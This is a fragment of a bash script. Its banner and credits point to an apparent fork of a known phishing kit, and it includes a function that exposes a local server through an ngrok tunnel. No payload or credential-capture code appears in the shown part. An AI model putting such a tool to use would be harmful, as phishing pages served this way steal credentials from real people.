...
##   Author 	: 	krishna 
##   Version 	: 	2.1
##   Github 	: 	https://github.com/deviboy66
...
banner() {
	cat <<- EOF
		...
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by devilboy66${WHITE}
	EOF
}
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}krishna ${RED}[ ${ORANGE}devilboy66 ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/devilboy66
		${GREEN}Version  ${RED}:  ${ORANGE}2.1

		${REDBG}${WHITE} Thanks : ThelinuxChoice
								  DarkSecDevelopers,kgs ${RESETBG}
...
start_ngrok() {
    ...
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to krishna
    else
